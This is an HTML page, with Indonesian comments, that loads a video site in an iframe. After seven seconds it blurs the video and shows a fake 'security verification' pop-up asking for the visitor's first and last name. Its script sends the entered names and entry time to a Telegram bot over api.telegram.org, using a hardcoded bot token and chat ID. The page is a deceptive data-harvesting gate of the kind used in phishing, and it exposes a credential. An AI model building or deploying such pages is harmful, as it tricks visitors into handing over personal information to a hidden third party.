<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat Halaman...</title>
    <style>
        * {
            box-sizing: border-box;
        }
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: 'Segoe UI', Roboto, sans-serif;
            overflow: hidden;
            background-color: #000;
        }

        /* Iframe untuk menampilkan Domain Anda di latar belakang */
        .site-container {
            width: 100%;
            height: 100%;
            border: none;
            transition: filter 0.5s ease;
        }

        /* Efek blur yang aktif setelah 7 detik */
        .blurred {
            filter: blur(8px) grayscale(30%);
            pointer-events: none; /* Mengunci interaksi dengan domain */
        }

        /* Overlay gelap di atas domain saat blur */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }

        .modal-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        /* Kotak Formulir di tengah layar */
        .modal-box {
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.4);
            width: 90%;
            max-width: 380px;
            text-align: center;
            transform: scale(0.8);
            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .modal-overlay.active .modal-box {
            transform: scale(1);
        }

        .modal-box h2 {
            margin: 0 0 10px 0;
            color: #222;
            font-size: 22px;
        }

        .modal-box p {
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
        }

        /* Desain Kolom Input */
        .input-group {
            margin-bottom: 15px;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s;
        }

        .input-group input:focus {
            border-color: #007bff;
        }

        /* Tombol Masuk */
        .btn-submit {
            width: 100%;
            padding: 12px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }

        .btn-submit:hover {
            background: #0056b3;
        }
    </style>
</head>
<body>

    <!-- TAMPILAN DOMAIN UTAMA ANDA -->
    <iframe src="https://vid30s.com/e/97ho2t7bshnc" class="site-container" id="mainSite"></iframe>

    <!-- POP-UP FORMULIR MASUK -->
    <div class="modal-overlay" id="loginModal">
        <div class="modal-box">
            <h2>Verifikasi Keamanan</h2>
            <p>Silakan masukkan nama Anda untuk melanjutkan akses ke domain ini.</p>
            
            <form id="visitorForm">
                <!-- Input Nama Depan -->
                <div class="input-group">
                    <input type="text" id="namaDepan" placeholder="Nama Depan" required>
                </div>

                <!-- Input Nama Belakang -->
                <div class="input-group">
                    <input type="text" id="namaBelakang" placeholder="Nama Belakang" required>
                </div>

                <button type="submit" class="btn-submit" id="submitBtn">Masuk Ke Situs</button>
            </form>
        </div>
    </div>

    <script>
        // KONFIGURASI TELEGRAM (GANTI DENGAN DATA ANDA)
        const TELEGRAM_TOKEN = '8944168845:AAFsb-toTlwSz9focFnMvQEAnDQyNByv5RA';
        const TELEGRAM_CHAT_ID = '1966317946';
        const DOMAIN_UTAMA = 'https://vid30s.com/e/97ho2t7bshnc';

        // 1. Catat waktu masuk presisi (WIB) saat halaman pertama dimuat
        const waktuMasuk = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + ' WIB';

        const mainSite = document.getElementById('mainSite');
        const loginModal = document.getElementById('loginModal');

        // 2. Hitung mundur 7 detik sebelum memblur layar dan menampilkan pop-up
        setTimeout(() => {
            mainSite.classList.add('blurred'); 
            loginModal.classList.add('active'); 
        }, 7000);

        // 3. Kirim data langsung ke API Telegram saat tombol diklik
        document.getElementById('visitorForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const namaDepan = document.getElementById('namaDepan').value;
            const namaBelakang = document.getElementById('namaBelakang').value;

            submitBtn.innerText = "Memverifikasi...";
            submitBtn.disabled = true;

            // Format pesan yang akan masuk ke Telegram Anda
            const teksPesan = `🔔 *Notifikasi Pengunjung Baru*\n\n` +
                              `👤 *Nama:* ${namaDepan} ${namaBelakang}\n` +
                              `🕒 *Waktu Masuk:* ${waktuMasuk}`;

            // URL API Telegram untuk mengirim pesan text
            const urlTelegram = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

            fetch(urlTelegram, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: teksPesan,
                    parse_mode: 'Markdown' // Agar teks di Telegram bisa tebal/bagus
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    // Jika sukses dikirim ke Telegram, hilangkan pop-up pengganggu
                    loginModal.classList.remove('active');
                    mainSite.classList.remove('blurred');
                    mainSite.style.pointerEvents = 'auto';
                    
                    // Opsional: Langsung arahkan keluar dari iframe ke situs asli
                    // window.location.href = DOMAIN_UTAMA;
                } else {
                    alert('Gagal mengirim verifikasi bot. Periksa Token/Chat ID Anda.');
                    submitBtn.innerText = "Masuk Ke Situs";
                    submitBtn.disabled = false;
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Terjadi kesalahan jaringan.');
                submitBtn.innerText = "Masuk Ke Situs";
                submitBtn.disabled = false;
            });
        });
    </script>

</body>
</html>
